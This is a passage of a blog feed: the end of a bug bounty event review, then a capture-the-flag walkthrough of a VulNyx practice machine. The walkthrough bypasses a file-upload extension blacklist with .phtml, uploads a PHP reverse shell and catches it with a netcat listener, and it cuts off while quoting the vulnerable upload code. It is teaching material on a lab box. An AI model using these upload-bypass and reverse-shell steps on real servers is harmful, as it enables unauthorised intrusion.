&lt;p&gt;However, the best was yet to come. By the end of the event I was absolutely exhausted so I was unable to work, but I knew that the last vulnerability I had reported could be escalated with a little more work. That’s why the following days I continue working on this vulnerability and I managed to escalate it to &lt;em&gt;High&lt;/em&gt;. The customer was very good and accepted the vulnerability with the new impact.&lt;/p&gt;

&lt;p&gt;Being my first live hacking event, I was very excited when my nickname appeared on the screen. I felt that I had achieved another milestone in my career as pentester.&lt;/p&gt;

&lt;div id=&quot;section-id-3-3&quot; /&gt;

&lt;h2 id=&quot;33-outcome-of-the-event&quot;&gt;3.3. Outcome of the event&lt;/h2&gt;

&lt;p&gt;In the following Linkedin post you can see how Yogosha published a thank you to customers:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/embed/feed/update/urn:li:ugcPost:7176490844202381313&quot;&gt;Yogosha post on Linkedin about HackerNight 2024&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/2024-06-10-hackernight-2024-my-first-live-hacking-event/linkedin-post.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;They also published a video about the event:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=45b8ykxyY7o&amp;amp;ab_channel=Yogosha&quot;&gt;Yogosha video on Youtube about HackerNight 2024&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In this video you can see that in the screen appear the nicknames of many hackers next to the customers where they got the first blood. For example &lt;em&gt;Lobuhi&lt;/em&gt; got the first blood at &lt;em&gt;Arize&lt;/em&gt;, &lt;em&gt;Borgi&lt;/em&gt; at &lt;em&gt;Spartoo&lt;/em&gt;… This is public information published by Yogosha, so I guess I can say that &lt;strong&gt;I got the first blood at &lt;a href=&quot;https://fr.linkedin.com/company/carter-cash&quot;&gt;Carter Cash&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Finally, the outcome of the event was:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;First blood in the Carter Cash program.&lt;/strong&gt; HackCommander appeared on the Kinepolis screen!&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;A good amount of money for a few hours of work.&lt;/strong&gt; I wish my hourly wage was what I earned that night…&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Direct access to the &lt;a href=&quot;https://yogosha.com/hackers/&quot;&gt;Yogosha Strike Force&lt;/a&gt;.&lt;/strong&gt; To enter this community it’s necessary to pass a series of CTFs, but if you report in a LHE a vulnerability of at least &lt;em&gt;Medium&lt;/em&gt; severity, you get a direct access to the community. I just had to write them a ticket because the process is not automatic, and since then I already receive invitations to private programs and I have a public profile as &lt;a href=&quot;https://app.yogosha.com/r/hackcommander&quot;&gt;HackCommander&lt;/a&gt; on Yogosha.&lt;/li&gt;
&lt;/ul&gt;

&lt;div id=&quot;section-id-3-4&quot; /&gt;

&lt;h2 id=&quot;34-conclusions-of-hackernight&quot;&gt;3.4. Conclusions of HackerNight&lt;/h2&gt;

&lt;p&gt;After all that I have explained, I believe that HackerNight has the following pros and cons:&lt;/p&gt;

&lt;h3 id=&quot;pros&quot;&gt;&lt;u&gt;Pros&lt;/u&gt;:&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;strong&gt;experience is incredible&lt;/strong&gt;, it’s immersive and unique.&lt;/li&gt;
  &lt;li&gt;The &lt;strong&gt;price is good&lt;/strong&gt; for everything they offer, even if you don’t win any bounties.&lt;/li&gt;
  &lt;li&gt;The &lt;strong&gt;people are great&lt;/strong&gt;, they are hackers, just like you.&lt;/li&gt;
  &lt;li&gt;Yogosha gave away &lt;strong&gt;merchandise and food&lt;/strong&gt; during the night.&lt;/li&gt;
  &lt;li&gt;It’s &lt;strong&gt;not just a one-night experience&lt;/strong&gt; because if you leave a report unfinished, you can continue working on it in the following days.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;cons&quot;&gt;&lt;u&gt;Cons&lt;/u&gt;:&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;It somewhat &lt;strong&gt;disrupts the RootedCON experience&lt;/strong&gt; because you miss the beers that night and possibly the talks during the the day if you’ve been sleeping to be well-rested.&lt;/li&gt;
  &lt;li&gt;Since it takes place at night, &lt;strong&gt;the schedule is challenging&lt;/strong&gt;, so you either sleep during the day or go more than 24 hours without sleep, as I did.&lt;/li&gt;
  &lt;li&gt;The &lt;strong&gt;work setup is not comfortable&lt;/strong&gt; because they don’t have monitors for the hackers, so you can only work with your laptop screen.&lt;/li&gt;
  &lt;li&gt;Other &lt;strong&gt;minor cons related to the programs&lt;/strong&gt;, but which I shouldn’t discuss due to the NDA.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Although some of the cons are fixable, I think &lt;strong&gt;HackerNight is a great event worth attending&lt;/strong&gt; that every bounty hunter should attend at least once in their lifetime. I will probably return next year :blush:.&lt;/p&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="review" /><category term="bug bounty" /><category term="life hacking event" /><category term="hackernight" /><category term="rootedcon" /><category term="yogosha" /><category term="first blood" /><summary type="html">Review of my experience at the HackerNight live hacking event in RootedCON and how I got the first blood on one of the customers.</summary></entry><entry><title type="html">VulNyx: Diff3r3ntS3c</title><link href="https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c/" rel="alternate" type="text/html" title="VulNyx: Diff3r3ntS3c" /><published>2024-04-08T00:00:00+02:00</published><updated>2024-04-08T00:00:00+02:00</updated><id>https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Port and service scanning&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Gaining access&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-2-1&quot;&gt;2.1. Detecting the arbitrary file upload&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-2-2&quot;&gt;2.2. Getting a shell as candidate&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-2-3&quot;&gt;2.3. Why does this arbitrary file upload exist?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Privilege escalation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Detecting the cronjob vulnerability&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Getting a shell as root&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-3&quot;&gt;3.3. Why does this privilege escalation via cronjob exist?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/box-info.png&quot; style=&quot;width: 750px;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this post we are going to see the writeup of the machine Diff3r3ntS3c from &lt;a href=&quot;https://vulnyx.com/&quot;&gt;VulNyx&lt;/a&gt;. It’s a low machine created by &lt;a href=&quot;https://blog.hackcommander.com/&quot;&gt;HackCommander&lt;/a&gt; (yeah, it’s me again :blush:) made in PHP without framework and especially designed for beginners. We are going to get access to the machine through an arbitrary file upload in a web form and then to escalate privileges through a cronjob executed as root using a script editable by any user.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-port-and-service-scanning&quot;&gt;1. Port and service scanning&lt;/h2&gt;

&lt;p&gt;After running a port scan&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 10000 10.0.2.20
&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-07 14:33 CEST
Nmap scan report for 10.0.2.20
Host is up (0.00010s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we can see that the port 80 is open and therefore there is a web. Now running a service scan&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.0.2.20
&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-07 14:34 CEST
Nmap scan report for 10.0.2.20
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Diff3r3ntS3c

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we can see that there is a webserver &lt;em&gt;Apache httpd 2.4.57&lt;/em&gt; running on Debian, but before looking for CVEs it is better to take a look at the web.&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-gaining-access&quot;&gt;2. Gaining access&lt;/h2&gt;

&lt;div id=&quot;section-id-2-1&quot; /&gt;

&lt;h2 id=&quot;21-detecting-the-arbitrary-file-upload&quot;&gt;2.1. Detecting the arbitrary file upload&lt;/h2&gt;

&lt;p&gt;Accessing the website, it looks like the website of a cybersecurity company&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/web-index.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and if we scroll down we can see that there is an upload form for candidates who want to work in the company&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/upload-form.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we try to upload a photo&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/upload-form-picture.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we get the following message&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/png-ok-response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems that it is not performing any file renaming or any modification on the uploaded file, which is a good sign for us as hackers. Now we should find the directory where the file was uploaded, for which we could use the ffuf tool as follows&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/OneListForAll/onelistforallmicro.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.0.2.20/FUZZ 
&lt;span class=&quot;go&quot;&gt;
        /&apos;___\  /&apos;___\           /&apos;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.20/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/OneListForAll/onelistforallmicro.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.ht_wsr.txt             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd-old           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.httpd.conf             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccessbak            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
index.phps              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.inc           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
?wsdl                   [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 1ms]
.htpasswds              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess-dev           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd.bak           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
server-status?full      [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htm.bak                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
?view=log               [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.old           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htgroup                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.bak           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.swp           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
assets                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.txt           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htm.old                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
yesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylngrequesturlbutwearedoingitonpurposewearescann [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
index.html              [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
.htpasswd_test          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htf                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.httr-oauth             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 235ms]
.htaccess_extra         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess_sc            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.save          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 247ms]
.htaccess.sample        [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.orig          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess_orig          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1ms]
.htusers                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htm                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.bak1          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
server-status?full&amp;amp;showmodulestate [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess-marco         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd.inc           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccessold2           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
                        [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
.htpasswrd              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.html.bak               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccessold            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
wp-config.phps          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
images                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
.htaccess-local         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.html.old               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess~              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
index.html?findcli=-1   [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
uploads                 [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 0ms]
:: Progress: [26468/26468] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:05] :: Errors: 1 ::
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, there is an &lt;em&gt;uploads&lt;/em&gt; directory. If we visit it we can see that this directory is vulnerable to &lt;em&gt;directory listing&lt;/em&gt; as we can see listed all the directories and files in the path&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-uploads.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we access directory &lt;em&gt;1&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we can see that there are 2 files, a &lt;em&gt;txt&lt;/em&gt; file with the user’s data&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-txt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and the png file that has been uploaded without any renaming or change in the content&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-png.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This may mean that the developer was not too careful in coding the file upload, since it is convenient to rename the uploaded files to avoid duplicate filenames and for security. However, sending the file upload request with burpsuite but changing the file extension to &lt;em&gt;php&lt;/em&gt; we receive the following message&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/php-not-ok-response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the backend is checking if the file extension is malicious or not. &lt;strong&gt;The question is whether it is using a whitelist or a blacklist of extensions&lt;/strong&gt; to perform this check, and depending on that there could be an &lt;a href=&quot;https://portswigger.net/web-security/file-upload&quot;&gt;arbitrary file upload&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If we go to &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/file-upload&quot;&gt;HackTricks&lt;/a&gt; we can see that there are some simple file upload methods that we can check manually before running more complex attacks&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/hacktricks.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We could copy all the extensions and send the burpsuite request to the intruder to check if there are any valid extensions. However, if it is using a blacklist of extensions it is quite likely that any of those extensions are valid, so using a random extension such as &lt;em&gt;phtml&lt;/em&gt;, it throws the following message&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/phtml-ok-response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This means that &lt;strong&gt;we bypassed the file extension check by uploading a file with an extension that also allows the execution of PHP code&lt;/strong&gt;.&lt;/p&gt;

&lt;div id=&quot;section-id-2-2&quot; /&gt;

&lt;h2 id=&quot;22-getting-a-shell-as-candidate&quot;&gt;2.2. Getting a shell as candidate&lt;/h2&gt;

&lt;p&gt;To verify if the backend performs any checks on the file content and if we can execute code, let’s try to upload the &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;pentestmonkey webshell&lt;/a&gt; with &lt;em&gt;phtml&lt;/em&gt; extension.&lt;/p&gt;

&lt;p&gt;After downloading the webshell, changing the extension to &lt;em&gt;phtml&lt;/em&gt; and changing the IP to that of my attacking machine as follows&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/webshell-conf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;it only remains to upload the webshell to the server. It is not necessary to use the burp for this task, and we can do it manually, receiving the following message&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/webshell-ok-response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we go to the last directory in the uploads directory and see that the shell was uploaded successfully&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-webshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After this, setting up a listener on the attacking machine on port 1234&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;nc -nlvp 1234
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and by clicking on the webshell, we receive the shell, and we can execute the following code&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 1234
&lt;span class=&quot;go&quot;&gt;listening on [any] 1234 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.20] 49956
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Linux Diff3r3ntS3c 6.1.0-18-amd64 #&lt;/span&gt;1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2024-02-01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x86_64 GNU/Linux
&lt;span class=&quot;go&quot;&gt; 16:45:30 up  2:22,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(candidate) gid=1000(candidate) groups=1000(candidate)
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;/bin/sh: 0: can&apos;t access tty;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;job control turned off
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;candidate
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/candidate
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;user.txt
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;where we can see that we got a shell as the &lt;em&gt;candidate&lt;/em&gt; user and that the user flag is in &lt;em&gt;/home/candidate/user.txt&lt;/em&gt;.&lt;/p&gt;

&lt;div id=&quot;section-id-2-3&quot; /&gt;

&lt;h2 id=&quot;23-why-does-this-arbitrary-file-upload-exist&quot;&gt;2.3. Why does this arbitrary file upload exist?&lt;/h2&gt;

&lt;p&gt;After opening the script &lt;em&gt;/var/www/html/uploadData.php&lt;/em&gt;, which is the one that performs the data upload, we can see the following PHP code&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Get the name and the phone number of the user&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$phone_number&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;phone_number&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Get the file name and file temporal name&lt;/span&gt;
